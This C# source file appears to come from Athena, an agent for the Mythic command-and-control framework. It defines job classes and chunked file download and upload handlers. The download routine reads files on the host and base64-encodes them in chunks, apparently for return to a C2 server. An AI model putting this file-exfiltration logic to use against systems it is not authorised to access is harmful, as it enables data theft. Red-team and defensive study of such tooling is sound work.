using Athena.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace Athena.Models.Mythic.Tasks
{
    public class MythicJob
    {
        public bool started { get; set; }
        public bool complete { get; set; }
        public bool hasoutput { get; set; }
        public bool errored { get; set; }
        public string taskresult { get; set; }
        //Will use this to determine if a long running assembly is still executing or not.
        //If it hasn't printed anything to console in a while, then after a few attempts we'll have to assume that it's been completed.
        public int resultpasses { get; set; }
        public MythicTask task { get; set; }
        public CancellationTokenSource cancellationtokensource { get; set; }

        public MythicJob() { }

        public MythicJob(MythicTask task)
        {
            this.task = task;
            this.started = false;
            this.complete = false;
            this.hasoutput = false;
            this.resultpasses = 0;
            this.cancellationtokensource = new CancellationTokenSource();
        }

    }
    public class MythicDownloadJob : MythicJob
    {
        public string file_id { get; set; }
        public int total_chunks { get; set; }
        public int chunk_num { get; set; }
        public long file_size { get; set; }
        public int chunk_size { get; set; } = 512000;
        public string path { get; set; }
        public bool downloadStarted { get; set; }
        public long bytesRead { get; set; }

        public MythicDownloadJob(MythicJob job)
        {
            this.task = job.task;
            this.chunk_size = 512000;
            this.started = job.started;
            this.complete = job.complete;
            this.hasoutput = job.hasoutput;
            this.errored = job.errored;
            this.taskresult = job.taskresult;
            this.resultpasses = job.resultpasses;
            this.cancellationtokensource = new CancellationTokenSource();
            this.downloadStarted = false;
            this.chunk_num = 0;
        }

        public string DownloadNextChunk()
        {
            try
            {
                FileStream fileStream = new FileStream(this.path, FileMode.Open, FileAccess.Read);
                if (total_chunks == 1)
                {
                    this.hasoutput = true;
                    this.complete = true;
                    this.errored = false;
                    return Misc.Base64Encode(File.ReadAllBytes(this.path));
                }
                else
                {
                    byte[] buffer = new byte[chunk_size];
                    long totalBytesRead = this.chunk_size * (chunk_num-1);

                    using (fileStream)
                    {
                        FileInfo fileInfo = new FileInfo(this.path);

                        if (fileInfo.Length - totalBytesRead < this.chunk_size)
                        {
                            buffer = new byte[fileInfo.Length - this.bytesRead];
                            fileStream.Seek(this.bytesRead, SeekOrigin.Begin);
                            this.bytesRead += fileStream.Read(buffer, 0, (int)(fileInfo.Length - this.bytesRead));
                            this.hasoutput = true;
                            this.complete = true;
                            this.errored = false;
                            return Misc.Base64Encode(buffer);
                        }
                        else
                        {
                            fileStream.Seek(this.bytesRead, SeekOrigin.Begin);
                            this.bytesRead += fileStream.Read(buffer, 0, this.chunk_size);
                            //Return task result
                            this.hasoutput = true;
                            return Misc.Base64Encode(buffer);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                this.hasoutput = true;
                this.errored = true;
                this.complete = true;
                return e.Message;
            }
        }

        /// <summary>
        /// Calculate the number of chunks required to download the file
        /// </summary>
        /// <param name="file">The path of the file</param>
        /// <param name="chunksize">The size of each chunk</param>
        public int GetTotalChunks()
        {
            try
            {
                var fi = new FileInfo(this.path);
                int total_chunks = (int)(fi.Length + this.chunk_size - 1) / this.chunk_size;
                return total_chunks;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return 0;
            }
        }
    }
    public class MythicUploadJob : MythicJob
    {
        public string file_id { get; set; }
        public int total_chunks { get; set; }
        public int chunk_num { get; set; }
        public long file_size { get; set; }
        public int chunk_size { get; set; } = 512000;
        public string path { get; set; }
        public bool uploadStarted { get; set; }

        public MythicUploadJob(MythicJob job)
        {
            this.task = job.task;
            this.chunk_size = 512000;
            this.started = job.started;
            this.complete = job.complete;
            this.hasoutput = job.hasoutput;
            this.errored = job.errored;
            this.taskresult = job.taskresult;
            this.resultpasses = job.resultpasses;
            this.cancellationtokensource = new CancellationTokenSource();
            this.uploadStarted = false;
            this.chunk_num = 0;
        }

        public bool uploadChunk(byte[] bytes, ref MythicJob job)
        {            
            try
            {
                if (this.chunk_num == this.total_chunks)
                {
                    this.complete = true;
                    job.hasoutput = true;
                    job.taskresult = "";
                }
                else
                {
                    job.hasoutput = true;
                    job.taskresult = "";
                    this.chunk_num++;
                }

                return true;
            }
            catch (Exception e)
            {
                job.complete = true;
                job.errored = true;
                job.taskresult = e.Message;
                job.hasoutput = true;
                this.complete = true;
                return false;
            }
        }
    }
}
